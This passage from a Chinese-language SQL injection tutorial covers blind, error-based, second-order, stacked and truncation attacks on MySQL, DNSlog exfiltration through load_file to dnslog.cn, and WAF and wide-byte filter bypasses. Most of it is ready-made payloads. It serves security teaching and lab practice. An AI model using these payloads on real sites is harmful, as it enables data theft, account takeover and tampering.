and substring(database(),1,1)=&#x27;s&#x27;--+\n根据and的特性，当and运算符左边的计算结果为真时会继续判断后边的运算结果，如果右边的结果也为真则整个语句为真，当右边的语句为假时，则整个语句为假；当and左边的运算结果为假时，则直接判断整个语句为假，举例如下\n1==1 and 1==2 //false 1==1为true,继续判断1==2的结果为false，整体为false1==1 and 2==2 //true 1==1为true,继续判断2==2的结果为true，整体为true1==2 and 1==1 //false 1==2为flse,直接判断整体为false，不再对右边的内容进行判断1==2 and 1==2 //fale 1==2为flse,直接判断整体为false，不再对右边的内容进行判断\n​      利用and的这个特性，id=1恒为真的时候，and右边substring子句的执行结果将直接影响这个SQL查询语句的结果，即substring子句为真，整个查询语句为真，页面正常回显内容，当substring子句为假的时候，整个查询语句为假，页面不正常回显内容。\n​       在上面我们构造的查询语句中，对数据库名的第一个字段进行了判断，假如判断正确，那么接着对第二个字符进行判断\n?id=1&#x27; and substring(database(),1,2)=&#x27;se&#x27;--+\n​       直到数据库名的最后一个字符被找出来。可以看到这个过程耗时耗力，我们要对所有可能的大小写字母、数字、特殊字符进行枚举，所以可以考虑透过自动化脚本的方式来进行判断。这里对脚本的编写推荐适用python语言，其request可以很方便的构造请求。\n​       要获取表名、字段名、数据，只需将上述database()替换为对应payload即可，如要获取表名\n1&#x27; or length((select database()))=8#    //判断数据库名字长度1&#x27; or ascii(substr((select database()),1,1))=115# //判断数据库名1&#x27; or (select count(table_name) from information_schema.tables where table_schema=database())=4#  //判断表的个数1&#x27; or ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),1,1))=117# //判断表的名字1&#x27; or (select count(column_name) from information_schema.columns where table_name=&#x27;users&#x27;)=14# //判断列的个数1&#x27; or ascii(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 12,1),1,1))=117# //判断列的名字1&#x27; or (select count(username) from users)=13#  //判断用户名和密码的个数1&#x27; or ascii(substr((select username from users limit 0,1),1,1))=68# //判断用户名和密码//or当然在不对 1 进行判断的情况下可以换为and\n时间盲注\n​        时间盲注与布尔盲注有异曲同工之妙，只不过判断语句正确与否的标志不再是查询结果有没有被正确得回显，而是网页的响应时间。看下面语句:\n?id=1&#x27; and if (length(database())&lt;20,sleep(5),1)--+\n​         上例中，通过length函数获取了当前数据库的长度并与20进行比较，如果数据库名长度小于20，那么则延时5秒向后端脚本程序回显查询结果，如果数据库名不小于20，则直接回显结果。延时5秒的结果表现在客户端就是当前浏览器tab的标题部分会一直转圈圈。然后通过二分法。即将上述语句中的20改为10继续测试，如果不小于10，则在将10修改为15，按照此规律我们逐渐紧逼找到当前数据库名的真正长度。数据库名的长度确认之后，我们就要开始获取数据库名的值了：\n?id=1&#x27; and if (substring(database(),1,1)=&#x27;s&#x27;,sleep(5),1)--+\n​       通过上述布尔盲注中讲到的方法，最终获取到数据库名。当然上面的语句我们还有其他的变种，如：\n?id=1&#x27; and if (ascii(substring(database(),1,1))=67,sleep(5),1)--+ //通过ascii码来比较?id=1&#x27; and if (hex(substring(database(),1,1))=FF,sleep(5),1)--+ //通过十六进制值来比较?id=1&#x27; and if (mid(database(),1,1)=&#x27;s&#x27;,sleep(5),1)--+ //使用mid函数代替substring?id=1&#x27; and if (substr(database(),1,1)=&#x27;s&#x27;,sleep(5),1)--+ //和substring是等效的?id=1&#x27; and if (left(database(),2)=&#x27;se&#x27;,sleep(5),1)--+ //截取左边两个个字符?id=1&#x27; and if (right(database(),2)=&#x27;ty&#x27;,sleep(5),1)--+ //截取右边两个字符\n​        要获取表明、字段名、数据只需将上面payload中的database()替换为联合查询注入中的payload即可，如要获取表名，则构造如下语句：\n?id=1&#x27;and if(length((select database()))&gt;9,sleep(5),1)--+ //长度?id=1&#x27;and if(ascii(substr((select database()),1,1))=115,sleep(5),1)--+//名字?id=1&#x27; and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),1))=5,sleep(5),1)--+//长度?id=1&#x27;and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()limit 3,1),1,1))&gt;99,sleep(5),1)--+ //名字?id=1&#x27; and if((select count(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),sleep(5),1)=14--+ //个数?id=1&#x27; and if(length(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 12,1),1))=8,sleep(5),1)--+ //长度?id=1&#x27; and if(ascii(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 12,1),1,1)),sleep(5),1)=117--+ //列名?id=1&#x27; and if((select count(username) from users)&gt;13,sleep(5),1)--+ //多少个用户名?id=1&#x27; and if(length(substr((select username from users limit 0,1),1))=4,sleep(5),1)--+   //用户名或者密码的长度?id=1&#x27; and if(ascii(substr((select username from users limit 0,1),1,1))=68,sleep(5),1)--+ //每个用户名和密码的名字 \n1、mid()函数\n此函数为截取字符串一部分。MID(column_name,start[,length])\n\n2、substr()函数\n用法：substr(string string,num start,num length);\nstring为字符串；start为起始位置；length为长度。\n注意：mysql中的start是从1开始的。\n例：substr(database(),1,1)=‘a’\n通过=右侧字母的改变和表达式的真假判断库名\n3、left()函数\n此函数用法：left(a,b)\n从左侧截取 a 的前 b 位\n例：left(database(),1)=‘a’\n通过=右侧字母的改变和表达式的真假判断库名\n4.2.3 报错注入\n报错注入就是利用数据库的某些正常的机制，人为得制造错误，将查询得结果携带在报错信息中回显到客户端。\n什么场景下有用？查询不回现内容，但会打印错误信息Update、Insert等语句，会打印错误信息（前面的union 不适合 update 语句）    这种场景的源码是怎样的?if($row)&#123;    echo &#x27;Your Login name:&#x27;.roe[&#x27;username&#x27;];&#125;else&#123;    print_r(mysql_error());&#125;\n当执行的SQL语句出错时返回错误信息，在错误信息中返回数据库的内容，即可实现SQL注入。那么实现SQL注入的难点就在于构造语句，制造错误，让错误中包含数据库内容。这里介绍3个函数引起报错，其他的函数类似。floor() select count() from information_schema.tables group by concat((select version()),floor(rand(0)2))    注: group by对rand（）函数操作时产生了错误extractvalue() extractvalue(1,concat(0x7e，(select user()),0x7e)) 注: xpath语法导致的错误updatexml() select updatexml(1,concat(0x7e,(select version()),0x7e),1) 注: xpath语法导致的错误\nupdatexml注入\n​      updatexml函数接受三个参数，第一个参数是一个xml格式的字符串，第二个参数是符合xpath语法规范的字符串，第三个参数是要替换成的字符串。该函数的功能就是从第一个xml字符串中通过xpath语法选择匹配的部分替换成第三个参数的内容。并且当xpath语法出现错误的时候，将会回显数据，于是我们将我们的查询语句放到第二个参数中，作为错误回显的一部分外带到客户端浏览器。比如需要获取库名，则构造如下语句\n?id=1&#x27; and updatexml(1,concat(0x7e,database()),1)--+ //and可以被替换为or,如果为or,则还有一处需要修改，请自行思考(我估计是改为-1即可)\n​      注意，concat是必须的，0x7e也是必须的，否则将不会回显错误信息，0x7e可以被别的十六进制数代替，但是有限制的，亲们可以自行尝试。且0x7e位置上的数字转换后必须为字符型，concat只能连接字符串，不能连接数字。获取表名、列名、数据的方法参见前文描述，这里不再赘述。\nextractvalue注入\n​      该函数与updatexml很像，但他只接受两个参数，且其定义与updatexml一样。\n?id=1&#x27; and extractvalue(1,concat(0x7e,database()))--+ //and可以被替换为or,如果为or,则还有一处需要修改，请自行思考\n主键重复报错\n看下面的例子\n?id=1&#x27; or (select 1 from (select count(*),concat(database(),floor(rand(0)*2))alias_a from information_schema.tables group by alias_a)b)--+\ngroup by子句能够根据一个或多个列对结果集进行分组floor函数的功能为向下取整rand函数将根据传入的随机数种子生成一个0-1之间的随机数，当传入的种子固定的时候，随机数的规律也就固定下来。count为聚合函数，配合group by 子句，将对分组字段相同的值进行计数。分析上面的例子将要达到的查询效果是：从information_schema.tables表中根据拼接字段alias_a对结果集进行计数输出。\n​           在上例中rand函数生成的随机数乘以2的范围就是0-2，那么再使用floor函数进行向下取整，其值就只能是0或者1。同时因为group by  的特性使得其在进行分组的时候会对后面的字段进行两次运算，group by  在进行分组的时候，会生成一张虚拟表记录数据，那么假设一种情况，当group  by进行第一次运算的时候，发现虚拟表中没有相同的数据，准备进行插入操作，但因为rand函数的随机性，导致在第二次运算的时候产生的结果在虚拟表中已经存在，那么在插入该数据的时候就会产生主键冲突，从而产生报错信息，将我们需要的数据通过报错信息外带。\n​     下例是查询数据库的payload，查询表名的方法如下，其他信息的查询方法请自行思考\n?id=1&#x27; or (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 1,1),floor(rand(0)*2))alias_a from information_schema.tables group by alias_a)b)--+\n可以总结出来一个模板\n?id=1&#x27; or (select 1 from (select count(*),concat((payload),floor(rand(0)*2)) from information_schema.tables group by alias_a)b)--+\n​     只需将上面模板中的内容替换成为我们的查询payload即可,alias_a与b均是字段别名\n几何函数注入\n可以使用的几何函数\ngeometrycollection:存储任意集合图形的集合multipoint:存储多个点polygon:多边形multipolygon:多个多边形linstring：线multilinestring：多条线point：点\npayload:\nselect * from  test where id=1 and mutilinestring((select*from(select * from (select user())a)b)))    //构造语法都是这样。GeometryCollection((select * from (select * from(select user())a)b))polygon((select * from(select * from(select user())a)b))multipoint((select * from(select * from(select user())a)b))multilinestring((select * from(select * from(select user())a)b))LINESTRING((select * from(select * from(select user())a)b))multipolygon((select * from(select * from(select user())a)b))\n只要上述函数中的参数不是集合形状数据，就会报错。有mysql版本限制。以上列表中基于geometric(集合函数)的报错注入在这个 commit 5caea4 中被修复，在5.5.x较后的版本中同样不再生效。\n基于溢出的注入\n~：按位取反（得到数据的二进制后，按位取反）\nexp(3)：自然对数的3次方，很容易就溢出了\nselect * from mysql.user where id=1 and exp(~(select * from (select user())a));\n~后的内容被取反后会得到一个很大的数，再做为自然对数的指数，得到的值一定会溢出，从而报错将查询结果显示出来.\n基于exp函数的报错注入在MySQL 5.5.49后的版本已经不再生效，具体可以参考这个 commit 95825f 。\n4.2.4 二次注入(二阶注入)\n二阶注入是指已存在的用户输入的数据被存储到数据库中，在用户再次使用该数据的时候导致的注入，这种注入类型是很难通过工具扫描或者黑盒测试发现的，往往需要通过白盒测试才能发现。比如现在有一个网站提供了用户注册与修改密码的功能。在用户登录的时候，通过函数对用户的输入进行了转义，如\n专有名词：白盒测试也称为结构测试，主要用于检测软件编码过程中的错误。程序员的编程经验、对编程软件的掌握程度、工作状态等因素都会影响到编程质量，导致代码错误。黑盒测试又称为功能测试，主要检测软件的每一个功能是否能够正常使用。在测试过程中，将程序看成不能打开的黑盒子，不考虑程序内部结构和特性的基础上通过程序接口进行测试，检查程序功能是否按照设计需求以及说明书的规定能够正常打开使用。\n$link = @mysqli_connect($host,$username,$password,$dbname,$port);$username=mysql_real_escape_string($_POST[&#x27;username&#x27;]);$passwd=mysql_real_escape_string($_POST[&#x27;passwd&#x27;]);$repasswd=mysql_real_escape_string($_POST[&#x27;repasswd&#x27;]);if ($passwd==$repasswd)&#123;    $query=&quot;select * from t_user where username=&#x27;&#123;$username&#125;&#x27; and passwd==&#x27;&#123;$passwd&#125;&#x27;&quot;;    $res=@mysqli_query($link,$query);    if (mysqli_num_rows($res)==1)&#123;        //登录成功    &#125;else&#123;        die(&#x27;用户名或密码错误&#x27;)    &#125;&#125;else&#123;    die(&quot;两次输入密码不一致&quot;)&#125;\n可以看到在登录界面，用户名与密码被mysql_real_escape_string函数做了转义，那么我们输入的单引号或者双引号就失去了作用，于是我们不能通过简单一次注入获取数据。再看用户注册界面的代码\n$link = @mysqli_connect($host,$username,$password,$dbname,$port);$username=mysql_escape_string($_POST[&#x27;username&#x27;]);$passwd=mysql_escape_string($_POST[&#x27;passwd&#x27;]);$repasswd=mysql_escape_string($_POST[&#x27;repasswd&#x27;]);if ($passwd==$repasswd)&#123;    $query=&quot;select * from t_user where username=&#x27;&#123;$username&#125;&#x27;&quot;;    $res=@mysqli_query($link,$query);    if (mysqli_num_rows($res)!=0)&#123;        //当前用户已存在    &#125;else&#123;        $query=&quot;insert into user values (&#x27;&#123;$username&#125;&#x27;,&#x27;&#123;$passwd&#125;&#x27;)&quot;;        $res=@mysqli_query($link,$query);        if (mysqli_affected_rows=1)&#123;            //新增用户成功        &#125;else&#123;            //未知错误，请检查后再输入        &#125;    &#125;&#125;else&#123;    die(&quot;两次输入密码不一致&quot;);&#125;\n可以看到注册界面的输入也被转义了，但是有一点，需要明确的是，经过msql_real_escape_string和addsashes转义的字符在插入到数据库中之后，会被解转义，不然我们注册的用户名就变了。利用这个特性我们就可以搞事情了。在用户修改密码时由这样的语句\n$link = @mysqli_connect($host,$username,$password,$dbname,$port);$username=mysql_escape_string($_POST[&#x27;username&#x27;]);$oldpasswd=mysql_escape_string($_POST[&#x27;oldpasswd&#x27;]);$newpasswd=mysql_escape_string($_POST[&#x27;newpasswd&#x27;]);$repasswd=mysql_escape_string($_POST[&#x27;repasswd&#x27;]);//首先判断用户名密码是否正确$query=&quot;select * from t_user where username=&#x27;&#123;$username&#125;&#x27; and passwd=&#x27;&#123;$oldpasswd&#125;&#x27;&quot;;$res=@mysqli_query($link,$query);if ($newpasswd==$repasswd &amp;&amp; mysqli_num_rows($res)!=0)&#123;    $query=&quot;update t_user set passwd=&#x27;&#123;$newpasswd&#125;&#x27; where username=&#x27;&#123;$username&#125;&#x27;&quot;;    $res=@mysqli_query($link,$query);        if (mysqli_affected_rows=1)&#123;            //密码修改成功        &#125;else&#123;            //未知错误，请检查后再输入        &#125;&#125;else&#123;    die(&quot;两次输入密码不一致或者用户名或者老密码输入错误&quot;);&#125;\n假如我们知道有一个用户名为admin的管理员账户，那么我们首先可以注册一个admin’#的账号，’#根据实际情况确定，密码为123456，然后我们正常登录到我们新注册的账号，跳转到修改密码的界面，然后输入用户名与密码之后点击确认，这时候后台的update语句变成了\n$query=&quot;update t_user set passwd=654321 where username=&#x27;admin&#x27;#&#x27;&quot;;\n所以这时候就修改了账户名为admin的密码，这时候我们就可以用我们的新密码直接登录管理员账户admin了。大家可以到sqli_labs靶场第24关进行试验。\n4.2.5 堆叠注入\nmysqli_multi_query()函数：\nStackedinjections:堆叠注入。从名词的含义就可以看到应该是一堆sql语句（多条）一起执行。而在真实的运用中也是这样的，我们知道在mysql中，主要是命令行中，每一条语句结尾加 ; 表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做堆叠注入\n在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql 语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而  unioninjection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union  all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。\n使用条件\nmysqli_multi_query（）执行多条查询的函数——防止注入改成mysqli_query()函数\n堆叠注入的使用条件十分有限，其可能受到API或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条sql语句时才能够使用，利用**mysqli_multi_query()**函数就支持多条sql语句同时执行，但实际情况中，如PHP为了防止sql注入机制，往往使用调用数据库的函数是mysqli_  query()函数，其只能执行一条语句，分号后面的内容将不会被执行，所以可以说堆叠注入的使用条件十分有限，一旦能够被使用，将可能对网站造成十分大的威胁。\n我们就可以在普通注入的后面，写上一条任意的SQL语句，例如插入数据，或者删库。\n?id=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+?id=-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; --+//执行完上述语句，我们得知了列名，此时我们根据具体列名，进行sql查询，删除等语句的执行?id=-1&#x27; ;insert into users(id,username,password)values(115,&#x27;1234&#x27;,&#x27;4567&#x27;);?id=-1&#x27; ;insert into users(id,username,password)values(100,&#x27;772211&#x27;,&#x27;112277&#x27;);随后执行?id=56，可以看到自己成功插入了密码用户名\n4.2.6 小tip: mysql长字符截断\nmysql中有一个环境变量配置sql_mode,定义了mysql应该支持的sql语法，数据校验等,可以通过以下方式查看当前数据库使用的sql_mode：\nselect @@sql_mode\n\n具体的参数解释见参考资料5：MySQL的sql_mode模式，mysql5.0版本以上支持了三种sql_mode模式，如下：\n\n默认情况下，mysql选择使用的是严格模式，此时如果插入的数据超过限制长度，则会报错error(如果超出的长度是由空格引起的，可能只会警告warning，实际操作证明，三种模式下，如果插入的超出长度是由空格引起的，并不会报错，仅仅会警告，本节最后给出结果):\ndescribe users;insert into users values (1,&#x27;admin&#x27;,&#x27;123&#x27;);#正常插入insert into users values (2,&#x27;admin   &#x27;,&#x27;123&#x27;);#username限制7个字符，这里插入8个字符（后3个为空格，插入成功，出现警告），出现截断情况insert into users values (3,&#x27;admin   x&#x27;,&#x27;1234&#x27;);#报错，提醒超长字符\n\n对于id=2的插入，可以查看其usernsme的长度,发现其长度为7:\nselect length(username) from users where id = 2;\n下面重点讨论当sql_mode模式为ANSI时引起的长字符截断问题：\n首先将sql_mode设置为ANSI模式：\nSET @@sql_mode=ANSI;\n接下来依次创建table,插入数据，这里发现username=&#x27;admin x’也插入成功了：\ncreate table users(    -&gt; id int(11) NOT NULL,    -&gt; username varchar(7) NOT NULL,    -&gt; password varchar(12) NOT NULL);#创建users表格insert into users values (1,&#x27;admin&#x27;,123);#正常插入insert into users values (2,&#x27;admin   &#x27;,1234);#警告，插入成功insert into users values (3,&#x27;admin  x&#x27;,12345);#警告，插入成功\n\n观察一下各个用户的长度，可以发现id=2,id=3的username均被截断，长度都变成了7：\nselect *from users;select length(username) from users where id =1;select length(username) from users where id =2;select length(username) from users where id =3;\n\n如果此时选择username= 'admin’会出现下面情况：\nselect username from users where username = &#x27;admin&#x27;;\n\n此时，我们只查询了用户名为admin的用户，但另外两个长度不一致的用户却出现，这会造成安全问题。假如，某个管理员的用户名就是admin,他采用下面的语句登录：\n$sql = &quot;select count ( * ) from users where username = ‘admin’ and password = ‘*****’ &quot;;\n此时，我们只要伪造用户’admin x’便可以获得管理员的信息，从而进入后台。\n补充： 对于三种模式下的空格插入溢出，并不会报错，结果如下：\nSET @@sql_mode=STRICT_TRANS_TABLES;insert into users values (4,&#x27;admin     &#x27;,12345);insert into users values (5,&#x27;admin     x&#x27;,12345);SET @@sql_mode=TRADITIONAL;insert into users values (6,&#x27;admin     &#x27;,123456);insert into users values (7,&#x27;admin     x&#x27;,123456);\n\n由此可见，预防长字符截断问题可能需要从其他地方入手，如账号由管理员分配并限制更改；对数据库内容加密，即使获取到相关信息也无法破解。\n假设管理员的账号就是admin，那么我们就去注册一个admin                                                                                                的用户.(PS:后面有哦很多空格，等待被截取掉就直接替换掉admin这个账号了)，也就是我们可以登录账户名为admin的账号了。\n4.3无回显\n4.3.1 DNS Log\n我们在发起网络请求的时候，第一步就是解析域名，当域名被成功解析的时候，该域名解析结果将被域名服务器记录下来，我们利用的正是这一点，将我们想要的数据放在域名的下一级域中外带到域名服务器，通过查询域名服务器的日志，从而获得我们想要的数据，如我们使用www.dnslog.cn 这个网站来测试\nping命令测试：\n点击获取子域名获取一个包含三级域名的域名给我们，这里我们使用ping命令做测试\nping %USERNAME%.4ap7wz.dnslog.cn\n当ping通的时候，我们点击该网站的刷新记录就可以看到我测试主机的用户名ChinaArmand了。该注入方法适用于需要时间盲注、没有回显的注入场景。构造mysql语句如下\n?id=1&#x27; and (select load_file(concat(&#x27;\\\\\\\\&#x27;,(select database()),&#x27;.4ap7wz.dnslog.cn\\\\abc&#x27;)))\n在到www.dnslog.cn看看是不是获取到了我们的数据库名,我们可以看到上面的语句使用了\\，这是windowsUNC路径的表示方法，所以在SQLI中DNSLog只适用于windows平台的服务器 。\nunc路径，是在windows平台上访问局域网网络资源的一种路径表示方法，我们在window上使用的文件共享服务路径就是通过这种方式，\\172.16.11.24 这也就解释了为什么只能在window平台的服务器上有效，另外多出来的两个\\表示转义。\nload_file 受mysql配置文件中secure_file_priv选项的限制， secure_file_priv= //允许所有secure_file_priv=&quot;G:\\&quot; //允许加载G盘secure_file_priv=null //拒绝\nDNSlog 介绍\n首先我们知道DNS是起ip与域名的解析的服务，通过ip可以解析到对应的域名。DNSlog就是储存在DNS上的域名相关的信息，它记录着你对域名或者IP的访问信息，也就是类似于日志文件，\nDNSlog回显原理\n首先了解一下多级域名的概念，我们知道因特网采用树状结构命名方法，按组织结构划分域是一个名字空间中一个被管理的划分，域可划分为子域，子域再可被划分为多级域名称为一级域名，二级域名，三级域名，从一个域名地址来从右到左依次是顶级域名，二级域名，三级域名,例如 gaobai.kxsy.com,\n通俗的说就是我有个域名kxsy.work，我将域名设置对应的ip 2.2.2.2 上，这样当我向dns服务器发起kxsy.work的解析请求时，DNSlog中会记录下他给kxsy.work解析，解析值为2.2.2.2，而我们这个解析的记录的值就是我们要利用的地方,这个过程被记录下来就是DNSlog,\n\nDNSlog 应用\n1.sql布尔盲注、时间盲注，注入的效率低且线程高容易被waf拦截，又或者是目标站点没有回显可利用NDSlog\n2.无回显的命令执行\n推荐三个大众化的免费dns解析记录网站\nhttp://www.dnslog.cn\nhttp://admin.dnslog.link\nhttp://ceye.io\n\nDNSlog回显注入条件\n1.数据库root权限，\n2.数据库可读写权限，secure_file_priv值为空，上期笔记有说明，\n3.windows系统，\nDNSlog-sql注入\n1.注册一个dns解析服务，利用唯一标识符，以无回显sql注入为例\n\n2.注入测试 需要闭合语句 替换标识符 利用盲注回显\n?id=1&#x27; and if((select load_file(concat(&#x27;\\\\\\\\&#x27;,(select database()),&#x27;.tlyypi.dnslog.cn\\\\abc&#x27;))),1,0)--+\n\n在回显数据时，域名能够接受的字符是有条件限制的，某些不适合作为域名的特殊字符可能会被屏蔽掉，针对这种情况我们也可以base64编码后再进行请求。\n0x05 SQLI防御及绕过\nWAF产生的背景：传统防火墙 （ firewall ） 阻断数据包工作网络层Web服务器功能丰富成为攻击目标 （应用层）waf由此而生WAF（web application rewall）称为web应用防火墙，他是通过执行一系列针对HTTP，HTTPS的安全策略，来专门对web应用提供保护的一款产品。WAF是基于规则的防护，可以提供各种web应用的安全规则，waf生产商去维护这个规则库，并实时为其更新，用户按照这些规则，可以对应用进行全方面的保护架构层绕过waf        用户本身是进入waf后访问web页面的，只要我们找到web的真实IP，绕过waf就不在话下了在同网段内，页面与页面之间，服务器与服务器之间，通过waf的保护，然后展示给我们，只要我们在内部服务之间进行访问，即可绕过waf边界漏洞，同样类似于同网段数据，我们可以利用已知服务器存在的ssrf漏洞，将数据直接发送给同网段的web2进行SQL注入资源限制角度绕waf  由于数据太大，会导致waf无法将所有的数据都检测完，这个时候会忽略掉我们代入的sql注入语句，从而绕过waf，即：使用POST请求，对服务器请求很大资源数据,逃逸sql注入语句。协议层面绕过基于协议层，有的waf只过滤GET请求，而对POST请求没做别的限制，因此，可以将GET型换为POST型文件格式，页面仅对Content-Type为application/x-www-form-urlencoded数据格式进行过滤，因此我们只要将Content-Type格式修改为multipart/form-data，即可绕过waf参数污染：有的waf仅对部分内容进行过滤，例如：index.php？id=1&amp;id=2&amp;id=3这样的参数id=1，waf也仅对前部分的id=1进行检测，而后面的参数并不做处理。这样我们就可以在id=2的后面写入sql注入语句进行sql注入规则层面绕waf等价函数 :      hex()、bin() ==&gt; ascii()             sleep() &gt;benchmark()             concat_ws()&gt;group_concat()            mid()、substr() ==&gt; substring()     @@version ==&gt; version()    等价符号 :and和or不能使用可以尝试下&amp;&amp;和||，还有=不能使用的情况可以考虑尝试&lt;、&gt;因为如果不小于又不大于那便是等于。逻辑异或xor,like(可以)特殊符号:使用反引号`，例如select `version()`，可以用来过空格和正则，特殊情况下还可以将其做注释符用, group by 9(可以)缓冲区溢出：and(select 1)=(Select 0xA*1000) uNiOn SeLeCt 1,2,version()　--+asp允许每个字符前面添加一个%号SELECT FIELD FROM TABLE ààà %S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E\n5.1 嵌套及大小写混淆绕过\n如果后台存在这样的语句\n$arg=str_replace(&#x27;union&#x27;,&#x27;&#x27;,$_GET[&#x27;id&#x27;]) //将union替换为空或者$arg=preg_replace(&#x27;/union/i&#x27;,&#x27;&#x27;,$_GET[&#x27;id&#x27;]) //将union替换为空，且不区分大小写\n我们可以这样构造payload\n?id=1&#x27; ununionion select 1,2,3%23 //上面两种用法均可这样绕过str_replace函数时不区分大小写的我们还可以通过UNion来绕过?id=1&#x27; UNion select 1,2,3 --+\n5.2 空格被过滤的绕过\n通过内内联注释\n部分程序过滤了空格，将输入限制为单个，则可以通过内联注释绕过 还可通过%a0 ,%09,%0a,%0b,%0c,%0d绕过\n?id=1&#x27; /**/union/**/order/**/by/**/2 %23//这里/* */中间部分的符号因题而异，可能会有字符的过滤，需要一个一个尝试，或者bp爆破\n通过括号–emmmmm基本没啥用，就当作SQL语句的拓展吧（倒是可以跟报错注入利用，毕竟报错注入需要的空格少）\n通过括号代替空格有点鸡肋，关键字是不能被括起来的，否则会报错，比如order by 3不能写作`(order)(by)(3)基本没啥用。\n5.3 逗号被过滤的绕过\nselect substr(database() from 1 to 1);select mid(database() from 1 to 1);\n作用也不大，用到逗号的地方很多，如要查两个字段union select username,passwd这里的逗号就不能这样写，当然我们可以每次只查一个字段。\n5.4 空字节绕过（也就是%00截断）\n用于绕过一些入侵检测系统，如ids ips等，这些检测系统一般都是用原生语言编写的，而这些语言检验字符串的结尾是通过检测空字节，在被检测系统检测的字符前面加上一个空字节就可以欺骗检测系统忽略被检测字符。%00-空字节\n5.5 编码绕过\n我们可以通过编码的方式欺骗后端的过滤机制\n1. char       select(char(67,58,45,56,67,45,35,44,3));2. 16进制编码    0x234532e34f2a34b3. hex4. unhex   select convert(unhex(&#x27;e3f23a44b445&#x27;)using utf8)5. to_base64(),from_base64()\n5.6 引号被转义\n背景知识:\n字符集在了解宽字节注入之前，我们先来看一看字符集是什么。字符集也叫字符编码，是一种将符号转换为二进制数的映射关系。几种常见的字符集：    ASCII编码：单字节编码    latin1编码：单字节编码    gbk编码：使用一字节和双字节编码，0x00-0x7F范围内是一位，和 ASCII 保持一致。双字节的第一字节范围是0x81-0xFE    UTF-8编码：使用一至四字节编码，0x00–0x7F范围内是一位，和 ASCII 保持一致。其它字符用二至四个字节变长表示。宽字节就是两个以上的字节，宽字节注入产生的原因就是各种字符编码的不当操作，使得攻击者可以通过宽字节编码绕过SQL注入防御。\n    GBK编码，是在GB2312-80标准基础上的内码扩展规范，使用了双字节编码方案，其编码范围从8140至FEFE（剔除xx7F），共23940个码位，共收录了21003个汉字，完全兼容GB2312-80标准，支持国际标准ISO/IEC10646-1和国家标准GB13000-1中的全部中日韩汉字，并包含了BIG5编码中的所有汉字——（摘自百度百科）。字符反斜线“\\” 的ASCII码值是5C，占用一个字节，GBK编码方式可以将反斜线“\\”转换为一个服务器数据库不识别的汉字，即在5C前面拼接组合一个字符0xdf，那么数据库就会将0xdf5c转换为一个不识别的汉字，这样数据库就会将其忽略掉。宽字节注⼊源于程序员设置MySQL连接时错误配置为：set character_set_client=gbk，这样配置会引发编码转换从⽽导致的注⼊漏洞。具体原理如下：1，正常情况下当GPC开启或使⽤addslashes函数过滤GET或POST提交的参数时，⿊客使⽤的单引号&#x27;就会被转义为: &#x27;；2，但如果存在宽字节注⼊，我们输⼊%df%27时⾸先经过上⾯提到的单引号转义变成了%df%5c%27（%5c是反斜杠），之后在数据库查询前由于使⽤了GBK多字节编码，即在汉字编码范围内两个字节会被编码为⼀个汉字。然后MySQL服务器会对查询语句进⾏GBK编码即%df%5c转换成了汉字“運”，⽽单引号逃逸了出来，从⽽造成了注⼊漏洞。GBK编码导致宽字节注⼊GBK编码是数据库编码，跟前台的编码⽆关GBK转UTF-8原理其实跟前⾯⾥原理⾥说的第2条是⼀样的，我们输⼊%df%27时⾸先经过上⾯提到的单引号转义变成了%df%5c%27（%5c是反斜杠），然后%df%5c正好属于gbk的汉字编码范围，经过iconv转换到utf-8编码转换后变成了汉字“運”，从⽽吞掉了反斜杠使得单引号逃脱出来。UTF-8转GBK这⾥我们思考下“錦”这个字，它的utf-8编码是e98ca6，它的gbk编码是%e5%5c，⽽上⾯提到过反斜杠\\正好为%5c。所以如果我们将title设置为：錦’，⾸先经过addlashes函数或GPC对单引号转义变为：錦’，然后会经过icnov函数会对”錦”转化为gbk编码，最后就是：％e5％5c％5c％27。反斜杠被转义了（％5c％5c），从⽽单引号逃逸出来就会引发注⼊漏洞。\n假设当前数据库使用GBK编码集，数据库会将输入的参数%df%5c解析为两个字节：\n\n​\t\t其中%df为高位字节，编码位是223；%5c为低位字节，编码位是92；%df%5c的GBK编码取值范围就是：第一个字节是129—254，第二个字节是64—254，数据库会按照GBK编码将%df%5c解析成一个汉字，这样“\\”就会失去原来的作用。\n\n在上图中，数据库将参数%df%5c按照GBK编码集解析成上图中的汉字：運，这种方式就是宽字节注入。\n宽字节注入有前提：要求目标MYSQL数据库的编码方式是GBK编码，并且客户端必须和数据库的编码方式一致，这样才能使用宽字节注入方式，宽字节注入过程如下所示：\n为了突破这个防护，我们可以使用宽字节注入的方式来进行突破，使用：\n%df ’\n当我们在单引号之前加上%df的时候，也就是输入%df ’ 这样传入到数据库中就会变成：\n%df%5c ’\n原理是在GBK编码中，%df与 \\ 的转义符%5c结合会编码成一个汉字，这样就使得 ’ 逃逸了。此外 %DE%5C,%E0%5C也都是可以的。\neg：\n传入1’时，返回结果出现1’ ',此处是不存在sql注入漏洞的，但是有一个特例，就是当数据库编码为GBK时可以使用宽字节注入，宽字节的格式是在地址后加一个%df，再加单引号，因为反斜杠的编码为%5c，而再GBK编码中%df%5c为一个繁体字，此时查询就会出错，一般结合Union注入使用。\n1%df' union select 1,2,3 %23查看输出位置\n\n查询表名时，一般使用语句\n1%df' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() %23 \n\n查询列名的时候会有所不同，因为对单引号进行了过滤\nselect 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=(select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()) 